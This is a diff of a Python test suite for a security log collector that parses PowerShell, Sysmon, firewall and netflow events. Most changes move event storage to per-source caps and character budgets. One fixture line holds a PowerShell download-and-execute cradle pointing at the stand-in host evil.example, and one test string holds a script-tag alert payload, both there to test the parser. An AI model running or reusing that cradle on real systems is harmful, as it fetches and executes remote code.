@@ -50,16 +50,69 @@ def test_last_time_is_the_latest_not_the_last_added():
     assert s.last_time("dns") == "2026-11-14T10:00:05.500Z"
 
 
-def test_ring_buffer_drops_the_oldest_event_across_sources():
-    s = ls.LogStore(max_events=3)
+def test_each_source_has_its_own_ring():
+    s = ls.LogStore(max_events=2)
     s.add("access", "2026-11-14T10:00:01Z", "a1", {})
     s.add("dns", "2026-11-14T10:00:02Z", "d1", {})
     s.add("access", "2026-11-14T10:00:03Z", "a2", {})
     s.add("mcp", "2026-11-14T10:00:04Z", "m1", {})
-    assert [e["message"] for e in s.snapshot()] == ["d1", "a2", "m1"]
-    assert s.counts()["access"] == 1 and s.counts()["dns"] == 1 and s.counts()["mcp"] == 1
-    s.add("mcp", "2026-11-14T10:00:05Z", "m2", {})
-    assert s.counts()["dns"] == 0 and s.last_time("dns") is None
+    s.add("access", "2026-11-14T10:00:05Z", "a3", {})
+    assert [e["message"] for e in s.snapshot()] == ["d1", "a2", "m1", "a3"]      # only access lost its oldest
+    assert s.counts()["access"] == 2 and s.counts()["dns"] == 1 and s.counts()["mcp"] == 1
+    s.add("dns", "2026-11-14T10:00:06Z", "d2", {})
+    s.add("dns", "2026-11-14T10:00:07Z", "d3", {})
+    assert [e["message"] for e in s.snapshot()] == ["a2", "m1", "a3", "d2", "d3"]
+    assert s.counts()["dns"] == 2 and s.last_time("dns") == "2026-11-14T10:00:07Z"
+
+
+def test_source_caps_are_the_documented_ones_and_can_be_overridden():
+    assert ls.SOURCE_CAPS == {"powershell": 15000, "firewall": 10000, "dns": 10000, "access": 10000,
+                              "netflow": 5000, "mcp": 5000}
+    assert ls.MAX_CHARS == 50_000_000
+    s = ls.LogStore(caps={"dns": 2})
+    for i in range(5):
+        s.add("dns", "2026-11-14T10:00:%02dZ" % i, f"d{i}", {})
+        s.add("access", "2026-11-14T10:00:%02dZ" % i, f"a{i}", {})
+    assert s.counts()["dns"] == 2 and s.counts()["access"] == 5
+
+
+def test_a_firewall_burst_does_not_evict_powershell_events():
+    s = ls.LogStore()
+    ps = [s.add("powershell", "2026-11-14T10:00:00Z", f"script {i}", {"i": i}) for i in range(100)]
+    for i in range(50000):
+        s.add("firewall", "2026-11-14T10:00:01Z", f"ALLOW {i}", {})
+    for i in range(20000):
+        s.add("access", "2026-11-14T10:00:02Z", f"GET /{i}", {})
+    snap = s.snapshot()
+    assert [e["id"] for e in snap if e["source"] == "powershell"] == [e["id"] for e in ps]
+    assert s.counts()["firewall"] == 10000 and s.counts()["access"] == 10000
+    fw = [e["message"] for e in snap if e["source"] == "firewall"]
+    assert fw[0] == "ALLOW 40000" and fw[-1] == "ALLOW 49999"
+
+
+def test_netflow_ring_is_capped_and_replaced_flows_do_not_push_others_out():
+    s = ls.LogStore(caps={"netflow": 3})
+    s.add("powershell", "2026-11-14T10:00:00Z", "p", {})
+    s.replace_netflows([{"time": "2026-11-14T10:00:%02dZ" % i, "message": f"f{i}", "fields": {"pid": i}}
+                        for i in range(5)])
+    assert [e["message"] for e in s.snapshot() if e["source"] == "netflow"] == ["f2", "f3", "f4"]
+    assert s.counts()["powershell"] == 1
+
+
+def test_snapshot_keeps_the_order_in_which_events_were_added():
+    s = ls.LogStore()
+    s.add("access", "2026-11-14T10:00:01Z", "a", {})
+    s.add("dns", "2026-11-14T10:00:02Z", "d", {})
+    s.add("access", "2026-11-14T10:00:03Z", "b", {})
+    assert [e["message"] for e in s.snapshot()] == ["a", "d", "b"]
+
+
+def test_get_returns_the_event_by_id_or_none():
+    s = ls.LogStore(caps={"access": 1})
+    a = s.add("access", "2026-11-14T10:00:01Z", "a", {})
+    b = s.add("access", "2026-11-14T10:00:02Z", "b", {})
+    assert s.get(b["id"]) == b and s.get(a["id"]) is None
+    assert s.get("nope") is None and s.get("dns-999") is None and s.get("bogus-1") is None
 
 
 def test_snapshot_is_a_copy():
@@ -177,7 +230,7 @@ def test_script_block_in_three_unordered_parts_is_one_event():
     e = events[0]
     assert e["source"] == "powershell"
     script = '$u = "http://evil.example/a.ps1"; $c = New-Object Net.WebClient; $c.DownloadString($u) | iex'
-    assert e["message"] == script and e["fields"]["script"] == script
+    assert e["message"] == script and "script" not in e["fields"]
     assert e["time"] == "2026-11-14T10:00:00.123Z"
     f = e["fields"]
     assert f["event_id"] == 4104 and f["record_id"] == 101 and f["pid"] == 4242 and f["user_sid"] == "S-1-5-18"
@@ -219,7 +272,7 @@ def test_broken_event_is_skipped_and_the_rest_is_kept():
 def test_script_text_stays_raw_html_and_ansi():
     e = ls.parse_powershell_events(sample("ps_misc.xml"))[-1]
     assert e["message"] == 'Write-Host "<script>alert(1)</script>" \x1b[31mred\x1b[0m'
-    assert e["fields"]["script"] == e["message"] and e["fields"]["path"] == "C:\\tools\\x.ps1"
+    assert "script" not in e["fields"] and e["fields"]["path"] == "C:\\tools\\x.ps1"
 
 
 def test_raw_escape_character_in_xml_text_survives():
@@ -434,6 +487,61 @@ def test_netflow_window_is_rebundled_not_double_counted():
     assert r.sysmon_calls[1][1] == "2026-11-14T09:59:57Z"      # newest event of the first read minus the overlap
 
 
+def _dns(epoch_offset_s, i):
+    ms = int(round(epoch_offset_s * 1000))
+    return {"timestamp": "2026-11-14T12:00:%02d.%03d+01:00" % (ms // 1000, ms % 1000) if ms < 60000 else "",
+            "event_id": 22, "pid": "1", "image": "a.exe", "query": f"h{i}.example", "result": "1.2.3.4"}
+
+
+class PagedSysmon:
+    """A Sysmon reader like the real one: oldest first, at most ``page`` events, ``since`` at second resolution."""
+
+    def __init__(self, events, page):
+        self.events, self.page, self.calls = events, page, []
+
+    def __call__(self, ids, since):
+        self.calls.append(since)
+        floor = ls._sysmon_epoch(since)
+        due = [e for e in self.events if ls._sysmon_epoch(e["timestamp"]) >= floor]
+        due.sort(key=lambda e: ls._sysmon_epoch(e["timestamp"]))
+        return due[:self.page]
+
+
+def test_a_sysmon_backlog_over_one_page_drains_over_the_ticks(monkeypatch):
+    monkeypatch.setattr(ls, "SYSMON_PAGE", 100)
+    r = Readers()
+    r.sysmon = [_dns(i * 0.1, i) for i in range(150)]               # 15 s of events, 100 per page
+    sysmon = PagedSysmon(r.sysmon, 100)
+    store = ls.LogStore()
+    c = ls.Collector(store, r.powershell, sysmon, r.firewall, lambda: NOW, utc_offset_s=3600)
+    for _ in range(4):
+        c.tick()
+    assert store.counts()["dns"] == 150
+    assert c._sysmon_since == pytest.approx(ls._sysmon_epoch(r.sysmon[-1]["timestamp"]) - ls.SYSMON_OVERLAP_S)
+
+
+def test_a_full_page_inside_the_overlap_still_moves_the_position_on(monkeypatch):
+    monkeypatch.setattr(ls, "SYSMON_PAGE", 100)
+    r = Readers()
+    r.sysmon = [_dns(i * 0.03, i) for i in range(150)]              # the first page spans less than the overlap
+    sysmon = PagedSysmon(r.sysmon, 100)
+    store = ls.LogStore()
+    c = ls.Collector(store, r.powershell, sysmon, r.firewall, lambda: NOW, utc_offset_s=3600)
+    for _ in range(4):
+        c.tick()
+    assert store.counts()["dns"] == 150
+
+
+def test_a_future_sysmon_timestamp_does_not_stall_the_position():
+    r = Readers()
+    r.sysmon = [conn("2026-11-14T15:00:00+01:00")]                  # 14:00Z, two hours after NOW
+    store, c = make_collector(r)
+    c.tick()
+    assert c._sysmon_since == NOW.timestamp() - ls.SYSMON_OVERLAP_S
+    c.tick()
+    assert r.sysmon_calls[1][1] == "2026-11-14T11:59:55Z"
+
+
 def test_dns_events_are_not_added_twice():
     r = Readers()
     q = {"timestamp": "2026-11-14T11:00:03+01:00", "event_id": 22, "pid": "1", "image": "a.exe",
@@ -563,16 +671,35 @@ def test_any_persist_error_is_swallowed_once(tmp_path, caplog):
     assert len([r for r in caplog.records if "persistence failed" in r.getMessage()]) == 1
 
 
-def test_store_has_a_character_budget_that_evicts_whole_oldest_events():
-    assert ls.MAX_CHARS == 200_000_000
-    s = ls.LogStore(max_events=100, max_chars=100)
-    s.add("access", "2026-11-14T10:00:01Z", "a" * 40, {})
-    s.add("dns", "2026-11-14T10:00:02Z", "b" * 30, {"query": "q" * 10})
-    assert s.counts()["access"] == 1
-    s.add("mcp", "2026-11-14T10:00:03Z", "c" * 40, {})
-    assert [e["source"] for e in s.snapshot()] == ["dns", "mcp"]
-    assert s.counts()["access"] == 0 and s.last_time("access") is None
-    assert s.snapshot()[1]["message"] == "c" * 40          # never shortened
+def test_store_has_a_character_budget_per_source_that_evicts_whole_oldest_events():
+    assert ls.MAX_CHARS == 50_000_000
+    s = ls.LogStore(max_chars=60, caps={"access": 1000, "dns": 1000, "mcp": 1000, "powershell": 1000,
+                                         "firewall": 1000, "netflow": 1000})
+    budget = 10                                      # 60 characters / six sources of the same cap
+    s.add("access", "2026-11-14T10:00:01Z", "a" * 6, {})
+    s.add("access", "2026-11-14T10:00:02Z", "b" * 3, {"q": "q"})
+    s.add("dns", "2026-11-14T10:00:03Z", "d" * budget, {})
+    assert [e["source"] for e in s.snapshot()] == ["access", "access", "dns"]
+    s.add("access", "2026-11-14T10:00:04Z", "c" * 5, {})                  # access would hold 4 + 6 + 5: the oldest goes
+    assert [e["message"] for e in s.snapshot() if e["source"] == "access"] == ["bbb", "c" * 5]
+    assert s.counts() == {"powershell": 0, "access": 2, "mcp": 0, "netflow": 0, "dns": 1, "firewall": 0}
+
+
+def test_the_character_budget_is_split_in_proportion_to_the_caps():
+    s = ls.LogStore(max_chars=1104, caps={"powershell": 1000, "access": 100, "mcp": 1, "netflow": 1, "dns": 1,
+                                          "firewall": 1})
+    s.add("powershell", "2026-11-14T10:00:01Z", "p" * 900, {})
+    s.add("access", "2026-11-14T10:00:01Z", "a" * 90, {})
+    s.add("access", "2026-11-14T10:00:02Z", "b" * 90, {})                  # access budget is 100
+    assert s.counts()["powershell"] == 1 and s.counts()["access"] == 1
+
+
+def test_one_source_over_its_character_budget_leaves_the_others_alone():
+    s = ls.LogStore(max_chars=600)
+    s.add("powershell", "2026-11-14T10:00:00Z", "keep me", {})
+    for i in range(50):
+        s.add("firewall", "2026-11-14T10:00:01Z", "f" * 40, {})
+    assert s.counts()["powershell"] == 1 and 0 < s.counts()["firewall"] < 50
 
 
 def test_an_event_over_the_budget_alone_is_kept_whole():
@@ -583,10 +710,11 @@ def test_an_event_over_the_budget_alone_is_kept_whole():
 
 
 def test_budget_counts_string_fields_and_replaced_netflows():
-    s = ls.LogStore(max_chars=60)
-    s.add("access", "2026-11-14T10:00:01Z", "m", {"path": "p" * 50})
-    s.replace_netflows([{"time": "2026-11-14T10:00:02Z", "message": "n" * 30, "fields": {"image": "i" * 20}}])
-    assert [e["source"] for e in s.snapshot()] == ["netflow"]
+    s = ls.LogStore(max_chars=60, caps={"netflow": 1000})                   # the whole budget is netflow's
+    s.add("netflow", "2026-11-14T10:00:00Z", "m", {"path": "p" * 50})
+    s.replace_netflows([{"time": "2026-11-14T10:00:02Z", "message": "n" * 30, "fields": {"image": "i" * 20}},
+                        {"time": "2026-11-14T10:00:03Z", "message": "o" * 30, "fields": {"image": "j" * 20}}])
+    assert [e["message"][0] for e in s.snapshot()] == ["o"]
 
 
 def test_a_failing_chunk_is_skipped_and_counted(monkeypatch):
